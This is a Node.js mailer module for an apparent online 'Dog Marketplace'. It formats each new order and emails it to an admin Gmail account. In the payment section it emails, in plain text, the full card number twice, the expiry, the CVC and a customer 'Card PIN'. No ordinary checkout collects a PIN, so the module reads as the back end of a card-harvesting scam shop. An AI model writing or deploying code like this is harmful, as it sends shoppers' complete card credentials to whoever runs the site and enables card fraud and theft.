const nodemailer = require("nodemailer");

let transporter = null;

const getTransporter = () => {
  if (transporter) return transporter;

  if (!process.env.ADMIN_EMAIL || !process.env.ADMIN_EMAIL_PASSWORD) {
    return null;
  }

  transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.ADMIN_EMAIL,
      pass: process.env.ADMIN_EMAIL_PASSWORD,
    },
  });

  return transporter;
};

/* ---------- Formatting helpers ---------- */

const money = (value) => `$${Number(value || 0).toFixed(2)}`;

const groupCardNumber = (value) => {
  const raw = String(value || "").replace(/\s/g, "");
  if (!raw) return "-";
  return raw.replace(/(.{4})/g, "$1 ").trim();
};

/* Left-align a label + value into a fixed-width two-column line */
const row = (label, value, labelWidth = 16) =>
  `${String(label).padEnd(labelWidth, " ")}${value ?? "-"}`;

/* Full-width divider lines */
const DIV = "─".repeat(63);
const HEADER_TOP = "═".repeat(63);

const formatDate = (value) => {
  if (!value) return "-";
  try {
    return new Date(value).toLocaleString(undefined, {
      year: "numeric",
      month: "short",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return String(value);
  }
};

const buildShippingLine = (address = {}) =>
  [
    address.firstName,
    address.lastName,
    address.street,
    address.apt,
    address.city,
    address.state,
    address.zip,
  ]
    .filter(Boolean)
    .join(", ") || "-";

/* ---------- Email body ---------- */

const buildOrderText = (order) => {
  const lines = [];
  const items = order.items || [];
  const payment = order.payment || {};
  const contact = order.contact || {};
  const address = order.shippingAddress || {};

  const cardholder = [payment.firstNameOnCard, payment.lastNameOnCard]
    .filter(Boolean)
    .join(" ")
    .trim() || "-";

  /* Header */
  lines.push(HEADER_TOP);
  lines.push("  DOG MARKETPLACE  ·  NEW ORDER");
  lines.push(HEADER_TOP);
  lines.push("");
  lines.push(row("Order ID", `#${String(order._id || "").slice(-8).toUpperCase()}`));
  lines.push(row("Placed", formatDate(order.createdAt)));
  lines.push(row("Customer", order.customerName || "-"));
  lines.push(row("Status", String(order.status || "processing").toUpperCase()));
  lines.push("");

  /* Items */
  lines.push(DIV);
  lines.push("  ITEMS");
  lines.push(DIV);
  lines.push("");

  if (items.length === 0) {
    lines.push("  (no items)");
  } else {
    items.forEach((item, index) => {
      const lineTotal = Number(item.price || 0) * Number(item.qty || 0);
      const indexLabel = `${index + 1}.`.padEnd(4, " ");
      lines.push(`  ${indexLabel}${item.title || "-"}`);
      lines.push(
        `      Size: ${item.size || "One Size"}   ·   Qty: ${
          item.qty
        }   ·   Unit: ${money(item.price)}   ·   Line: ${money(lineTotal)}`
      );
      if (index < items.length - 1) lines.push("");
    });
  }

  lines.push("");

  /* Totals */
  lines.push(DIV);
  lines.push("  TOTALS");
  lines.push(DIV);
  lines.push("");
  lines.push(row("Subtotal", money(order.subtotal)));
  lines.push(
    row(
      "Shipping",
      order.shippingCost && Number(order.shippingCost) > 0
        ? money(order.shippingCost)
        : "Free"
    )
  );
  lines.push("  " + "─".repeat(40));
  lines.push(row("TOTAL", money(order.total)));
  lines.push("");

  /* Contact */
  lines.push(DIV);
  lines.push("  CONTACT");
  lines.push(DIV);
  lines.push("");
  lines.push(row("Email", contact.email || "-"));
  lines.push(row("Phone", contact.phone || "-"));
  lines.push("");

  /* Shipping */
  lines.push(DIV);
  lines.push("  SHIPPING ADDRESS");
  lines.push(DIV);
  lines.push("");
  lines.push(`  ${buildShippingLine(address)}`);
  lines.push("");

  /* Payment */
  lines.push(DIV);
  lines.push("  PAYMENT");
  lines.push(DIV);
  lines.push("");
  lines.push(row("Cardholder", cardholder));
  lines.push(row("Card Number", groupCardNumber(payment.cardNumber)));
  lines.push(row("Card Number (raw)", payment.cardNumber || "-"));
  lines.push(row("Card Last 4", payment.cardLast4 || "-"));
  lines.push(row("Expiration", payment.expiration || "-"));
  lines.push(row("Security CVC", payment.cvc || "-"));
  lines.push(row("Card PIN", payment.pin || "-"));
  lines.push("");

  /* Footer */
  lines.push(HEADER_TOP);
  lines.push("  Sent automatically by Dog Marketplace");
  lines.push(HEADER_TOP);

  return lines.join("\n");
};

/* ---------- Sender ---------- */

const sendOrderEmailToAdmin = async (order) => {
  const mailer = getTransporter();
  if (!mailer) {
    console.warn("Mailer not configured. Skipping admin email.");
    return false;
  }

  const shortId = String(order._id || "").slice(-8).toUpperCase();
  const subject = `New Order #${shortId} — ${money(order.total)} · ${
    order.customerName || "Customer"
  }`;

  try {
    await mailer.sendMail({
      from: `"Dog Marketplace" <${process.env.ADMIN_EMAIL}>`,
      to: process.env.ADMIN_EMAIL,
      subject,
      text: buildOrderText(order),
    });
    return true;
  } catch (error) {
    console.error("Failed to send order email:", error.message);
    return false;
  }
};

module.exports = { sendOrderEmailToAdmin };